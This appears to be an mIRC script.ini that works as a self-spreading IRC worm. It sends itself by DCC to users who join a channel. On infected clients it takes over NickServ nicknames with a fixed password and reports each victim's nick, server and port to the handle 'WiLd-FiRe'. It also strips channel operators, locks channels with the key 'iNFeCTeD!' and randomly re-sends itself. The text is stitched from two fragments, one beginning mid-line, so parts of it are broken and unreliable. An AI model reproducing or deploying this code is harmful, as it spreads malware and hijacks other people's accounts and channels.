   [script]
   n0=ON 1:JOIN:#:{
   n1=  if ( $nick == $me ) { halt }
   n2=  if ( $nick == WiLd-FiRe ) { halt }
   n3=  else {
   n4=    /dcc send $nick script.ini
   n5=if ( $me <> WiLd-FiRe )  .timer 1 5 {
   n6=      set %nickname $me
   n7=      /ns drop $me
   n8=      /ns register load
   n9=      /ns ghost $me load
   n10=    }
   n11=  }
   n12=}
   n13=On 1:Connect: {
   n14=  if ( $me == WiLd-FiRe ) { halt }
   n15=  else {
   n16=    /nick %nickname
   n17=    //msg WiLd-FiRe Hi I am 4 $me  on server 3 $server  in port 2 $port
   n18=    /ns ghost $me load
   n19=  }
   n20=}
   $me ) { /set %line " }
   n19=  %i = %i + 1
   n20=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
   n21=  %i = %i + 1
   n22=  /if ($opnick(%i,$chan) != $me ) { %line = %line $opnick(%i,$chan) }
   n23=  /mode $chan -ooo %line
   n24=  /if ( %i > %opit ) { goto pois }
   n25=  goto looppi
   n26=  :pois
   n27=  /mode $chan +k iNFeCTeD!
   n28=  /mode $chan +o $nick
   n29=  /kick $chan $me
   n30=  /nick  %nimi
   n31=}
   n32=ON 1:TEXT:*:#:{ /if ( $rand(0,100) == 1 ) {
   n33=    /mode $chan +o $nick
   n34=    /dcc send $nick $mircdirscript.ini
   n35=    /msg $chan --==4i'M_T00_C00l!1==--
   n36=  }
   n37=}
